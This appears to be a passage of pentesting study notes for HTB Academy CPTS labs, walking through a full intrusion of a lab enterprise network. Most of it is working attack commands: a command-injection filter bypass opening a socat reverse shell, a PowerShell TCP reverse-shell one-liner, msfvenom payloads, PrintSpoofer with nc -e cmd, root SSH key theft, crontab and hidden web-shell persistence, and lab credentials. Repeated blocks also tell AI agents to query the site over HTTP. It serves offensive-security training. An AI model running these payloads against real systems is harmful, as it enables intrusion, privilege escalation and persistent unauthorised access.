+Lab 3: WordPress exploitation → Theme editor → Reverse shell
+Lab 4: SQL injection → Database enumeration → User password extraction
+Lab 5: XSS exploitation → Cookie stealing → Session hijacking
+Lab 6: SSRF vulnerability → Local file read → Flag extraction
+Lab 7: GitLab registration → Project access → Flag discovery
+Lab 8: XXE injection → XML manipulation → File system access
+Lab 9: Authentication brute force → Command injection → Flag retrieval
+```
+
+### 🔍 Key Learning Points
+
+```cmd wrap
+# Professional approach:
+- Systematic application testing
+- Evidence collection for each finding
+- Business impact assessment
+- Remediation priority guidance
+
+# Technical skills:
+- Multi-vector exploitation chains
+- Filter bypass techniques  
+- Session management attacks
+- Local file read escalation
+
+# Real-world scenarios:
+- Weak credential prevalence
+- Development environment exposure
+- Misconfigured public services
+- Internal network pivot opportunities
+```
+
+## 🛡️ Defensive Recommendations
+
+### 🔒 Application Security
+
+```cmd wrap
+# Input validation:
+- Implement proper input sanitization
+- Use parameterized queries (SQL injection prevention)
+- Validate file uploads (type, size, content)
+- Escape user output (XSS prevention)
+
+# Authentication security:
+- Enforce strong password policies
+- Implement account lockout mechanisms  
+- Use multi-factor authentication
+- Regular credential audits
+
+# Configuration hardening:
+- Remove test/development applications
+- Disable unnecessary HTTP methods
+- Configure proper error handling
+- Implement security headers
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/web-enumeration-exploitation.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Initial Access
+
+## 🎯 Overview
+
+**Initial Access** transforms **external reconnaissance** into **stable internal network foothold**. This phase focuses on converting **command injection** into **reverse shells**, **TTY upgrades**, and **privilege escalation** to establish persistent access for internal Active Directory attacks.
+
+## 🚀 Reverse Shell Establishment
+
+### 🔧 Socat Reverse Shell (Filter Bypass)
+
+```bash wrap
+# Base socat command (filtered):
+socat TCP4:ATTACKER_IP:PORT EXEC:/bin/bash
+
+# Filter bypass payload:
+GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:ATTACKER_IP:8443${IFS}EXEC:bash
+
+# Explanation:
+%0a         # Newline character (command separator bypass)
+'s'o'c'a't' # Single quotes around each character (command bypass)
+${IFS}      # Environment variable for space bypass
+```
+
+### 🎧 Listener Setup
+
+```bash wrap
+# Start netcat listener
+nc -nvlp 8443
+
+# Expected connection:
+connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 51496
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+```
+
+## 🔄 TTY Upgrade Process
+
+### 🛠️ Socat Interactive Terminal
+
+```bash wrap
+# 1. Start socat listener on attacker
+socat file:`tty`,raw,echo=0 tcp-listen:4443
+
+# 2. Execute from target reverse shell
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4443
+
+# 3. Result: Full interactive TTY
+webdev@dmz01:/var/www/html/monitoring$ id
+uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+```
+
+### 🐍 Alternative Python TTY
+
+```bash wrap
+# Standard Python upgrade method
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Benefits of socat upgrade:
+- Full terminal functionality
+- Command completion support
+- Text editor capability
+- su/sudo/ssh compatibility
+```
+
+## 🔍 Privilege Escalation Discovery
+
+### 📋 Audit Log Analysis
+
+```bash wrap
+# Group membership analysis
+id
+# Output: uid=1004(webdev) gid=1004(webdev) groups=1004(webdev),4(adm)
+
+# adm group privileges:
+- Read access to ALL logs in /var/log
+- Audit log access capabilities
+- System monitoring permissions
+
+# Audit log credential discovery
+aureport --tty | less
+```
+
+### 🔐 Credential Extraction from Logs
+
+```bash wrap
+# TTY Report analysis:
+# date time event auid term sess comm data
+===============================================
+1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",<nl>
+2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",<nl>
+3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",<nl>
+4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
+
+# Discovered credentials:
+srvadm:ILFreightnixadm!
+```
+
+### 🔺 User Escalation
+
+```bash wrap
+# Switch to srvadm user
+su srvadm
+Password: ILFreightnixadm!
+
+# Verify privilege escalation
+whoami
+# Output: srvadm
+
+# Interactive bash shell
+/bin/bash -i
+srvadm@dmz01:/var/www/html/monitoring$
+```
+
+## 🌐 Network Position Analysis
+
+### 📊 Network Interface Discovery
+
+```bash wrap
+# Interface enumeration
+ifconfig
+
+# Key findings:
+ens160: 10.129.203.101  # External interface
+ens192: 172.16.8.120    # Internal network interface
+
+# Network positioning:
+- DMZ host with dual interfaces
+- External web services exposure
+- Internal AD network connectivity
+- Pivot opportunity into corporate environment
+```
+
+### 🎯 Host Information
+
+```bash wrap
+# System identification
+hostname
+# Output: dmz01
+
+# User enumeration
+cat /etc/passwd | grep -E "sh$"
+# Active user accounts analysis
+
+# Service analysis
+ps aux | grep -v "]"
+# Running processes and services
+
+# Network connections
+netstat -antup
+# Active connections and listening services
+```
+
+## 🔒 Persistence Preparation
+
+### 🛡️ Access Maintenance Strategy
+
+```bash wrap
+# Current access chain:
+1. Command injection (monitoring app)
+2. Reverse shell (webdev user)
+3. TTY upgrade (socat)
+4. Privilege escalation (srvadm)
+
+# Persistence considerations:
+- SSH key deployment
+- Backdoor web shell placement
+- Service manipulation
+- Scheduled task creation
+```
+
+### 📋 Next Steps Planning
+
+```cmd wrap
+# Immediate priorities:
+1. Root privilege escalation
+2. Persistence mechanism establishment  
+3. Internal network reconnaissance
+4. Active Directory enumeration
+5. Lateral movement preparation
+
+# Intelligence gathering:
+- Network topology mapping
+- Domain controller identification
+- Service account discovery
+- Trust relationship analysis
+```
+
+## 🎯 HTB Academy Lab
+
+### 📋 Lab Solution Summary
+
+```cmd wrap
+# Attack chain execution:
+1. Web application brute force → admin:12qwaszx
+2. Command injection discovery → connection_test vulnerability
+3. Filter bypass → %0a + single quotes + ${IFS}
+4. Socat reverse shell → stable shell establishment
+5. TTY upgrade → full terminal functionality
+6. Audit log analysis → credential discovery
+7. User escalation → srvadm access
+8. Flag retrieval → /home/srvadm/flag.txt
+
+# Key techniques demonstrated:
+- Advanced filter bypass methods
+- Professional TTY upgrade process
+- Audit log credential mining
+- Systematic privilege escalation
+```
+
+### 🔍 Learning Objectives
+
+```cmd wrap
+# Technical skills:
+- Command injection exploitation
+- Character filter bypass techniques
+- Reverse shell stabilization methods
+- Linux audit log analysis
+
+# Professional methodology:
+- Systematic service testing approach
+- Evidence collection during exploitation
+- Privilege escalation documentation
+- Network position assessment
+
+# Real-world application:
+- DMZ host compromise scenarios
+- Internal network pivot preparation
+- Credential discovery techniques
+- Persistence planning strategies
+```
+
+## 🛡️ Defensive Recommendations
+
+### 🔒 Application Security
+
+```cmd wrap
+# Input validation:
+- Implement strict character whitelisting
+- Use parameterized commands (avoid shell_exec)
+- Deploy Web Application Firewall
+- Regular security code reviews
+
+# Network security:
+- DMZ network segmentation
+- Internal network access controls
+- Audit log monitoring and alerting
+- Privilege escalation detection
+
+# System hardening:
+- Audit log access restrictions
+- User privilege minimization
+- Service account management
+- Regular credential rotation
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/initial-access.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Post-Exploitation Persistence
+
+## 🎯 Overview
+
+**Post-exploitation persistence** ensures **stable access** after hard-fought initial compromise. Transform unstable reverse shells into **persistent SSH access**, escalate to **root privileges**, and establish **reliable pivot points** for internal Active Directory attacks.
+
+## 🔒 Establishing Stable Access
+
+### 🔑 SSH Connection Upgrade
+
+```bash wrap
+# Leverage discovered credentials for stable access
+ssh srvadm@TARGET_IP
+Password: ILFreightnixadm!
+
+# Benefits of SSH over reverse shells:
+- Stable connection (no timeouts)
+- Daily access restoration capability
+- Efficient tunneling/pivoting setup
+- Professional testing workflow
+- Backup access method
+```
+
+### 📊 System Information Gathering
+
+```bash wrap
+# Network interface analysis
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-113-generic x86_64)
+
+System information as of [DATE]:
+IPv4 address for br-65c448355ed2: 172.18.0.1    # Docker bridge
+IPv4 address for docker0:         172.17.0.1    # Docker default
+IPv4 address for ens160:          10.129.203.111 # External interface
+IPv4 address for ens192:          172.16.8.120   # Internal AD network
+
+# Key observations:
+- DMZ positioning with dual interfaces
+- Docker environment present
+- Internal network connectivity confirmed
+- Pivot opportunity into 172.16.8.0/23 scope
+```
+
+## 🔺 Local Privilege Escalation
+
+### 🔍 Privilege Assessment
+
+```bash wrap
+# Standard privilege escalation checks
+id
+# Output: uid=1003(srvadm) gid=1003(srvadm) groups=1003(srvadm)
+
+# Sudo privileges enumeration
+sudo -l
+
+# Result:
+User srvadm may run the following commands on dmz01:
+    (ALL) NOPASSWD: /usr/bin/openssl
+```
+
+### 🛠️ OpenSSL GTFOBin Exploitation
+
+```bash wrap
+# GTFOBins reference: https://gtfobins.github.io/gtfobins/openssl/
+# Privileged file read capability
+
+# Target: Root SSH private key
+LFILE=/root/.ssh/id_rsa
+sudo /usr/bin/openssl enc -in $LFILE
+
+# Expected output:
+-----BEGIN OPENSSH PRIVATE KEY-----
+[BASE64_ENCODED_PRIVATE_KEY]
+-----END OPENSSH PRIVATE KEY-----
+```
+
+### 🔐 SSH Key Persistence Setup
+
+```bash wrap
+# 1. Save extracted private key locally
+cat > dmz01_root_key << 'EOF'
+-----BEGIN OPENSSH PRIVATE KEY-----
+[EXTRACTED_PRIVATE_KEY_CONTENT]
+-----END OPENSSH PRIVATE KEY-----
+EOF
+
+# 2. Set proper permissions
+chmod 600 dmz01_root_key
+
+# 3. Test root SSH access
+ssh -i dmz01_root_key root@TARGET_IP
+
+# 4. Verify root privileges
+root@dmz01:~# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## 🎯 Persistence Benefits Analysis
+
+### 🚀 Access Advantages
+
+```cmd wrap
+# Stable SSH access provides:
+- Immediate daily access restoration
+- No complex exploitation chain repetition
+- Reliable tunneling/pivoting capabilities
+- Professional assessment efficiency
+- Backup access redundancy
+
+# Root privileges enable:
+- Complete system control
+- Advanced persistence mechanisms
+- Network configuration access
+- Internal reconnaissance capabilities
+- Pivot infrastructure deployment
+```
+
+### 🔄 Alternative Persistence Methods
+
+```bash wrap
+# SSH key deployment (if no existing keys):
+ssh-keygen -t rsa -b 4096
+cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
+
+# Backdoor web shell placement:
+cp webshell.php /var/www/html/.hidden/
+chown www-data:www-data /var/www/html/.hidden/webshell.php
+
+# Service manipulation:
+systemctl enable custom-backdoor.service
+systemctl start custom-backdoor.service
+
+# Scheduled task persistence:
+echo "* * * * * root /tmp/.backdoor" >> /etc/crontab
+```
+
+## 🌐 Network Position Assessment
+
+### 📊 DMZ Host Analysis
+
+```bash wrap
+# Network topology understanding:
+External Network (10.129.x.x) → DMZ (dmz01) → Internal Network (172.16.8.0/23)
+
+# Host role identification:
+- Web services hosting (monitoring, dev applications)
+- Network boundary device
+- Dual-homed system (external + internal)
+- Pivot point into corporate environment
+
+# Service enumeration:
+ps aux | grep -v "]"          # Running services
+netstat -antup                # Network connections
+systemctl list-units --type=service  # System services
+```
+
+### 🎯 Internal Network Preparation
+
+```bash wrap
+# Network discovery preparation:
+ip route                      # Routing table analysis
+arp -a                       # ARP table enumeration  
+cat /etc/resolv.conf         # DNS configuration
+cat /etc/hosts               # Static host entries
+
+# Pivot planning:
+- SSH tunneling capabilities
+- Port forwarding setup
+- SOCKS proxy configuration
+- Internal reconnaissance staging
+```
+
+## 🛡️ Operational Security
+
+### 🔒 Access Maintenance
+
+```cmd wrap
+# Best practices:
+- Save private keys securely (encrypted storage)
+- Document access credentials
+- Test backup access methods
+- Monitor for account changes
+- Plan for credential rotation
+
+# Risk mitigation:
+- Use non-obvious persistence methods
+- Avoid high-visibility modifications
+- Clean up temporary files
+- Document all system changes
+```
+
+### 📋 Pivot Preparation Checklist
+
+```cmd wrap
+# Pre-pivot requirements:
+✅ Stable SSH access established
+✅ Root privileges confirmed
+✅ Network interfaces mapped
+✅ Internal network connectivity verified
+✅ Backup access methods deployed
+
+# Next phase preparation:
+- Internal network scanning
+- Active Directory enumeration
+- Domain controller identification
+- Service account discovery
+- Lateral movement planning
+```
+
+## 🎯 HTB Academy Lab
+
+### 📋 Lab Solution Summary
+
+```cmd wrap
+# Persistence establishment chain:
+1. SSH connection → srvadm:ILFreightnixadm!
+2. Sudo enumeration → /usr/bin/openssl NOPASSWD
+3. GTFOBin exploitation → privileged file read
+4. SSH key extraction → /root/.ssh/id_rsa
+5. Root access establishment → stable persistence
+6. Flag retrieval → /root/flag.txt
+
+# Key techniques demonstrated:
+- Credential reuse for stable access
+- GTFOBins privilege escalation
+- SSH key-based persistence
+- Professional access maintenance
+```
+
+### 🔍 Learning Objectives
+
+```cmd wrap
+# Technical skills:
+- GTFOBins exploitation techniques
+- SSH key-based persistence methods
+- Privilege escalation validation
+- Network position assessment
+
+# Professional methodology:
+- Stable access prioritization
+- Backup access planning
+- Documentation standards
+- Operational security practices
+
+# Real-world application:
+- DMZ compromise scenarios
+- Persistence in enterprise environments
+- Internal network pivot preparation
+- Long-term access maintenance
+```
+
+## 🛡️ Defensive Recommendations
+
+### 🔒 System Hardening
+
+```cmd wrap
+# Sudo configuration:
+- Remove unnecessary NOPASSWD entries
+- Implement least privilege principles
+- Regular sudo access audits
+- Command logging and monitoring
+
+# SSH security:
+- Disable root SSH access
+- Implement key-based authentication only
+- Use SSH certificates instead of keys
+- Monitor SSH access logs
+
+# File system protection:
+- Restrict access to sensitive files
+- Implement file integrity monitoring
+- Regular permission audits
+- Secure backup storage
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/post-exploitation-persistence.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Internal Information Gathering
+
+## 🎯 Overview
+
+**Internal Information Gathering** transforms **external foothold** into **comprehensive internal reconnaissance**. Establish **SSH/Metasploit pivoting**, discover **live hosts**, enumerate **Active Directory infrastructure**, and exploit **misconfigured services** for credential harvesting and lateral movement preparation.
+
+## 🔄 Pivoting Setup Methods
+
+### 🔑 SSH Dynamic Port Forwarding
+
+```bash wrap
+# Establish SSH SOCKS proxy
+ssh -D 8081 -i dmz01_key root@TARGET_IP
+
+# Verify tunnel establishment
+netstat -antp | grep 8081
+# Output: tcp 0 0 127.0.0.1:8081 0.0.0.0:* LISTEN 122808/ssh
+
+# ProxyChains configuration
+echo "socks4 127.0.0.1 8081" >> /etc/proxychains.conf
+
+# Test connectivity
+proxychains nmap -sT -p 21,22,80,8080 172.16.8.120
+```
+
+### 🎯 Metasploit Autoroute Alternative
+
+```bash wrap
+# 1. Generate Meterpreter payload
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f elf > shell.elf
+
+# 2. Transfer to target
+scp -i dmz01_key shell.elf root@TARGET_IP:/tmp
+
+# 3. Setup multi/handler
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST ATTACKER_IP
+set LPORT 443
+exploit
+
+# 4. Execute payload on target
+chmod +x shell.elf && ./shell.elf
+
+# 5. Setup autoroute
+use post/multi/manage/autoroute
+set SESSION 1
+set SUBNET 172.16.8.0
+run
+```
+
+## 🔍 Internal Host Discovery
+
+### 📊 Network Scanning Approaches
+
+```bash wrap
+# Method 1: Bash ping sweep (from pivot host)
+for i in $(seq 254); do ping 172.16.8.$i -c1 -W1 & done | grep from
+# Results:
+64 bytes from 172.16.8.3: icmp_seq=1 ttl=128 time=0.472 ms    # Domain Controller
+64 bytes from 172.16.8.20: icmp_seq=1 ttl=128 time=0.433 ms   # Windows + NFS
+64 bytes from 172.16.8.50: icmp_seq=1 ttl=128 time=0.642 ms   # Windows + Tomcat
+64 bytes from 172.16.8.120: icmp_seq=1 ttl=64 time=0.031 ms   # DMZ host
+
+# Method 2: Metasploit ping sweep
+use post/multi/gather/ping_sweep
+set RHOSTS 172.16.8.0/23
+set SESSION 1
+run
+
+# Method 3: ProxyChains Nmap (slow but comprehensive)
+proxychains nmap -sn 172.16.8.0/23
+```
+
+### 🎯 Discovered Infrastructure
+
+```cmd wrap
+# Network topology mapping:
+172.16.8.3   - Domain Controller (DNS, Kerberos, LDAP, SMB)
+172.16.8.20  - Windows Server (HTTP, NFS, RDP)  
+172.16.8.50  - Windows Server (SMB, RDP, Tomcat 8080)
+172.16.8.120 - DMZ Host (current position)
+
+# Service prioritization:
+High: NFS (172.16.8.20) - potential credential exposure
+Medium: Tomcat (172.16.8.50) - brute force target
+Low: Domain Controller (172.16.8.3) - hardened target
+```
+
+## 🔍 Service Enumeration Results
+
+### 📊 172.16.8.3 - Domain Controller Analysis
+
+```bash wrap
+# Port enumeration:
+53/tcp   open  domain      # DNS
+88/tcp   open  kerberos    # Kerberos authentication
+135/tcp  open  epmap       # RPC endpoint mapper
+139/tcp  open  netbios-ssn # NetBIOS session service
+389/tcp  open  ldap        # LDAP
+445/tcp  open  microsoft-ds # SMB
+464/tcp  open  kpasswd     # Kerberos password change
+593/tcp  open  unknown     # RPC over HTTP
+636/tcp  open  ldaps       # LDAP over SSL
+
+# SMB NULL session attempt:
+proxychains enum4linux -U -P 172.16.8.3
+# Result: NT_STATUS_ACCESS_DENIED (hardened configuration)
+# Domain identified: INLANEFREIGHT
+# Domain SID: S-1-5-21-2814148634-3729814499-1637837074
+```
+
+### 🖥️ 172.16.8.50 - Tomcat Server Analysis
+
+```bash wrap
+# Port enumeration:
+135/tcp  open  epmap       # RPC endpoint mapper
+139/tcp  open  netbios-ssn # NetBIOS session service
+445/tcp  open  microsoft-ds # SMB
+3389/tcp open  ms-wbt-server # RDP
+8080/tcp open  http-alt     # Tomcat
+
+# Tomcat Manager brute force attempt:
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 172.16.8.50
+set STOP_ON_SUCCESS true
+run
+# Result: No successful authentication (hardened)
+```
+
+### 🌐 172.16.8.20 - Windows Server + NFS
+
+```bash wrap
+# Port enumeration:
+80/tcp   open  http        # DotNetNuke (DNN)
+111/tcp  open  sunrpc      # RPC port mapper
+135/tcp  open  epmap       # RPC endpoint mapper
+139/tcp  open  netbios-ssn # NetBIOS session service
+445/tcp  open  microsoft-ds # SMB
+2049/tcp open  nfs         # Network File System
+3389/tcp open  ms-wbt-server # RDP
+
+# NFS share discovery:
+proxychains showmount -e 172.16.8.20
+# Result: /DEV01 (everyone) - anonymous access enabled
+```
+
+## 📁 NFS Share Exploitation
+
+### 🔍 NFS Misconfiguration Assessment
+
+```bash wrap
+# NFS export enumeration
+showmount -e 172.16.8.20
+# Output: Export list for 172.16.8.20: /DEV01 (everyone)
+
+# Mount NFS share (from pivot host)
+mkdir /tmp/DEV01
+mount -t nfs 172.16.8.20:/DEV01 /tmp/DEV01
+
+# Share content analysis
+ls -la /tmp/DEV01/
+# Discovered:
+BuildPackages.bat
+CKToolbarButtons.xml  
+DNN/                    # DotNetNuke directory
+WatchersNET.CKEditor.sln
+```
+
+### 🔐 Credential Discovery in Config Files
+
+```bash wrap
+# DNN configuration analysis
+cd /tmp/DEV01/DNN/
+ls -la
+
+# Key files discovered:
+web.config              # Primary configuration
+web.Debug.config        # Debug configuration  
+web.Deploy.config       # Deployment configuration
+web.Release.config      # Release configuration
+
+# Credential extraction from web.config:
+cat web.config
+# Discovered credentials:
+<username>Administrator</username>
+<password>
+    <value>D0tn31Nuk3R0ck$$@123</value>
+</password>
+```
+
+## 🌐 DotNetNuke (DNN) Analysis
+
+### 📊 Application Assessment
+
+```bash wrap
+# DNN installation discovery
+proxychains curl http://172.16.8.20
+# Result: DNN installation page
+
+# Admin login page access
+http://172.16.8.20/Login?returnurl=%2fadmin
+
+# User registration attempt:
+# Result: "Email sent to Site Administrator for verification"
+# Assessment: Manual approval required (unlikely to succeed)
+
+# Credential validation:
+Administrator:D0tn31Nuk3R0ck$$@123
+# Source: NFS share web.config file
+```
+
+### 🔍 Firefox SOCKS Proxy Configuration
+
+```cmd wrap
+# Firefox proxy setup:
+1. Settings → General → Network Settings
+2. Manual proxy configuration
+3. SOCKS Host: 127.0.0.1
+4. Port: 8081
+5. SOCKS v5 selected
+6. Proxy DNS when using SOCKS v5: enabled
+
+# Direct internal network access:
+http://172.16.8.20 → DNN installation page
+http://172.16.8.20/Login → Admin authentication portal
+```
+
+## 📡 Network Traffic Analysis
+
+### 🔍 Packet Capture Setup
+
+```bash wrap
+# Traffic monitoring from pivot host
+tcpdump -i ens192 -s 65535 -w ilfreight_pcap
+
+# Capture statistics:
+^C2027 packets captured
+2033 packets received by filter
+0 packets dropped by kernel
+
+# Analysis workflow:
+1. Transfer PCAP to attack host
+2. Open in Wireshark for analysis
+3. Search for cleartext credentials
+4. Identify additional services/hosts
+5. Map network communication patterns
+```
+
+### 📊 Network Intelligence Gathering
+
+```bash wrap
+# Routing table analysis
+ip route
+# DNS configuration
+cat /etc/resolv.conf
+# ARP table enumeration
+arp -a
+# Network interface details
+ifconfig -a
+# Active connections
+netstat -antup
+```
+
+## 🎯 Attack Surface Assessment
+
+### 🔴 High-Priority Targets
+
+```cmd wrap
+# 172.16.8.20 (DEV01):
+- DNN installation (potential admin access)
+- NFS misconfiguration (credential exposure)
+- Development environment (likely less hardened)
+- Web.config credentials discovered
+
+# 172.16.8.3 (Domain Controller):
+- Active Directory services
+- Kerberos authentication
+- LDAP directory services
+- SMB hardened (NULL session denied)
+
+# 172.16.8.50 (Windows Server):
+- Tomcat 10 installation
+- RDP services available
+- SMB services present
+- Authentication hardened
+```
+
+### 🟡 Secondary Targets
+
+```cmd wrap
+# Additional reconnaissance opportunities:
+- Full TCP port scans on discovered hosts
+- UDP service discovery
+- SMB share enumeration (authenticated)
+- Web application directory brute forcing
+- Service version vulnerability research
+```
+
+## 🛠️ Tools & Techniques Summary
+
+### 🔄 Pivoting Methods
+
+```bash wrap
+# SSH dynamic port forwarding:
+ssh -D PORT -i private_key user@target
+
+# Metasploit autoroute:
+post/multi/manage/autoroute → automatic route discovery
+
+# ProxyChains integration:
+proxychains [command] → tunnel through established SOCKS proxy
+```
+
+### 🔍 Discovery Techniques
+
+```bash wrap
+# Host discovery:
+- Bash ping sweep (fast, efficient)
+- Metasploit ping_sweep module
+- Nmap through ProxyChains (slow but comprehensive)
+
+# Service enumeration:
+- Static Nmap binary on pivot host
+- ProxyChains Nmap from attack host
+- Metasploit auxiliary modules
+
+# Credential hunting:
+- NFS share mounting and analysis
+- Configuration file examination
+- Network traffic capture and analysis
+```
+
+## 🎯 HTB Academy Lab
+
+### 📋 Lab Solution Summary
+
+```cmd wrap
+# Internal reconnaissance chain:
+1. SSH pivot setup → Dynamic port forwarding (8081)
+2. ProxyChains configuration → SOCKS proxy integration
+3. Host discovery → Bash ping sweep identification
+4. Service enumeration → Nmap through pivot
+5. NFS exploitation → Anonymous share mounting
+6. Credential discovery → web.config analysis
+7. Flag retrieval → /DEV01/flag.txt
+
+# Key techniques demonstrated:
+- Professional pivoting methodologies
+- NFS share exploitation techniques
+- Configuration file credential mining
+- Internal network reconnaissance
+```
+
+### 🔍 Learning Objectives
+
+```cmd wrap
+# Technical skills:
+- SSH dynamic port forwarding setup
+- ProxyChains configuration and usage
+- NFS share mounting and enumeration
+- Configuration file analysis techniques
+
+# Professional methodology:
+- Systematic internal reconnaissance
+- Service prioritization strategies
+- Evidence collection standards
+- Network topology mapping
+
+# Real-world application:
+- Enterprise network pivoting
+- Development environment exploitation
+- Credential hunting in file shares
+- Active Directory preparation
+```
+
+## 🛡️ Defensive Recommendations
+
+### 🔒 Network Security
+
+```cmd wrap
+# Network segmentation:
+- Implement proper DMZ isolation
+- Restrict internal network access
+- Deploy network access controls
+- Monitor east-west traffic
+
+# Service hardening:
+- Disable unnecessary NFS exports
+- Implement NFS access controls
+- Secure configuration file storage
+- Regular credential rotation
+
+# Monitoring and detection:
+- Network traffic analysis
+- Unusual connection monitoring
+- Privilege escalation detection
+- File access auditing
+```
+
+
+---
+
+# Agent Instructions
+This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.
+
+## Querying This Documentation
+If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.
+
+Perform an HTTP GET request on the current page URL with the `ask` query parameter:
+
+```
+GET https://kabaneridev.gitbook.io/pentesting-notes/certification-preparation/cpts-prep/attacking-enterprise-networks/internal-information-gathering.md?ask=<question>
+```
+
+The question should be specific, self-contained, and written in natural language.
+The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.
+
+Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
+
+---
+
+## Exploitation & Privilege Escalation
+
+## 🎯 Overview
+
+**Exploitation & Privilege Escalation** transforms **credential discovery** into **SYSTEM-level access** on internal hosts. Leverage **DotNetNuke (DNN) administrative access**, enable **xp\_cmdshell**, exploit **SeImpersonate privileges** with **PrintSpoofer**, and establish **multiple persistence methods** for reliable internal network control.
+
+## 🌐 DotNetNuke (DNN) Exploitation
+
+### 🔐 Administrative Access
+
+```bash wrap
+# Credential validation from NFS discovery
+Administrator:D0tn31Nuk3R0ck$$@123
+# Source: /DEV01/DNN/web.config
+
+# Login verification
+http://172.16.8.20/Login?returnurl=%2fadmin
+# Result: SuperUser administrator account access
+
+# Findings to document:
+1. Insecure File Shares (NFS anonymous access)
+2. Sensitive Data on File Shares (credentials in config)
+```
+
+### 🛠️ SQL Console Exploitation
+
+```sql wrap
+-- Enable xp_cmdshell for command execution
+EXEC sp_configure 'show advanced options', '1'
+RECONFIGURE
+EXEC sp_configure 'xp_cmdshell', '1' 
+RECONFIGURE
+
+-- Test command execution
+xp_cmdshell 'whoami'
+-- Output: nt service\mssql$sqlexpress
+```
+
+### 📁 File Extension Bypass
+
+```cmd wrap
+# DNN file upload configuration:
+1. Settings → Security → More → More Security Settings
+2. Allowable File Extensions: asp,aspx,exe,SAVE
+3. Save configuration
+
+# Upload capabilities enabled:
+- ASP web shells (.asp, .aspx)
+- Executable files (.exe)
+- Registry dumps (.SAVE)
+```
+
+## 🔺 Privilege Escalation Techniques
+
+### 🖥️ Web Shell Deployment
+
+```bash wrap
+# ASP web shell upload
+1. Download newcmdasp.asp from GitHub
+2. Upload via DNN File Management (/admin/file-management)
+3. Access web shell via uploaded file URL
+4. Test command execution: whoami
+
+# Result: iis apppool\dotnetnukeapppool
+# Privileges: SeImpersonate (exploitable)
+```
+
+### 🚀 PowerShell Reverse Shell
+
+```powershell wrap
+# Reverse shell payload (from web shell):
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.8.120',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Listener setup (on dmz01):
+nc -nvlp 9999
+# Result: Interactive PowerShell session
+```
+
+### 🎯 PrintSpoofer Exploitation
+
+```bash wrap
+# Prerequisites:
+1. Upload nc.exe and PrintSpoofer64.exe via DNN
+2. Verify SeImpersonate privilege
+3. Setup listener on dmz01
+
+# PrintSpoofer execution:
+c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
+
+# Expected privileges:
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+
+# Result: NT AUTHORITY\SYSTEM shell
+```
+
+## 💾 Credential Harvesting
+
+### 🔐 SAM Database Extraction
+
+```cmd wrap
+# Registry hive dumping (as SYSTEM):
